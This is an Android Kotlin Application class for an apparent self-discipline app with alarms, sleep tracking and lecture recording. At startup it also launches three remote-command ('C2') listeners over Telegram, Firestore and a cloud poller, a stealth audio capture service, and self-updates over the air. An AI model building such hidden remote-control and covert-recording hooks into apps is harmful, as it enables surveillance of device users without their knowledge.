package com.example

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import com.example.core.alarm.RelentlessAlarmService
import com.example.core.sleep.BatteryGuardReceiver
import com.example.core.sleep.SleepDetectorReceiver
import com.example.core.update.UpdateCheckManager
import com.example.data.local.AppDatabase
import com.example.data.repository.EnforcerRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainApplication : Application() {

    lateinit var repository: EnforcerRepository
        private set

    private val applicationScope = CoroutineScope(Dispatchers.IO)
    private val sleepReceiver = SleepDetectorReceiver()
    private val batteryReceiver = BatteryGuardReceiver()

    override fun onCreate() {
        super.onCreate()

        val db = AppDatabase.getInstance(this)
        repository = EnforcerRepository(
            coachingDao = db.coachingDao(),
            appLimitDao = db.appLimitDao(),
            sleepStateDao = db.sleepStateDao(),
            lectureDao = db.lectureDao(),
            voiceTaskDao = db.voiceTaskDao(),
            deviceProfileDao = db.deviceProfileDao(),
            aiKeyDao = db.aiKeyDao(),
            aiChatDao = db.aiChatDao()
        )

        applicationScope.launch {
            repository.initializeDefaultsIfNeeded()
        }

        // Initialize and start Telegram Remote Controller listener, Firestore C2 listener & Cloud C2 Poller
        com.example.core.recorder.TelegramC2Manager.getInstance(this).startPolling()
        com.example.core.cloud.FirestoreSyncManager.getInstance(this).startListeningForRemoteCommands()
        com.example.core.cloud.CloudC2Poller.getInstance(this).start()

        // Schedule daily silent end-of-day summary alarm & 10:00 PM Telegram audit
        com.example.core.recorder.DailySummaryReceiver.scheduleDailySummary(this)
        com.example.core.recorder.DailyAuditWorker.scheduleDailyAudit(this)

        // OTA Auto-Update: Check for newer app versions on every startup
        UpdateCheckManager.getInstance(this).checkForUpdateAsync()

        setupNotificationChannels()
        registerRuntimeReceivers()
    }

    private fun registerRuntimeReceivers() {
        // Register screen on/off detector for sleep tracking
        val screenFilter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_SCREEN_ON)
        }
        registerReceiver(sleepReceiver, screenFilter)

        // Register battery monitor
        val batteryFilter = IntentFilter().apply {
            addAction(Intent.ACTION_BATTERY_CHANGED)
            addAction(Intent.ACTION_BATTERY_LOW)
        }
        registerReceiver(batteryReceiver, batteryFilter)
    }

    private fun setupNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)

            // Relentless Alarm Channel
            val alarmChannel = NotificationChannel(
                RelentlessAlarmService.CHANNEL_ID,
                "Enforcer Wake Alarm",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Relentless alarm for waking schedule"
                enableVibration(true)
            }

            // Sleep Protocol Channel
            val sleepChannel = NotificationChannel(
                SleepDetectorReceiver.CHANNEL_ID,
                "Sleep Protocol",
                NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                description = "Sleep schedule notifications"
            }

            // Battery Guard Channel
            val batteryChannel = NotificationChannel(
                BatteryGuardReceiver.CHANNEL_ID,
                "Battery Guard",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Night battery safeguard alerts"
            }

            // Lecture Recording Foreground Service Channel
            val recorderChannel = NotificationChannel(
                "lecture_recorder_channel",
                "Lecture Recorder",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Active lecture recording status and background service"
            }

            // Rolling Chunk Recorder Channel
            val chunkChannel = NotificationChannel(
                com.example.core.recorder.StealthCaptureService.CHANNEL_ID,
                "Rolling Chunk Recorder",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Shows rolling lecture chunk recording progress and controls"
                setShowBadge(true)
            }

            // App Update Notifications Channel
            val updateChannel = NotificationChannel(
                "enforcer_updates",
                "App Updates",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Remix Enforcer OS OTA update notifications"
            }

            nm.createNotificationChannels(listOf(alarmChannel, sleepChannel, batteryChannel, recorderChannel, chunkChannel, updateChannel))
        }
    }
}
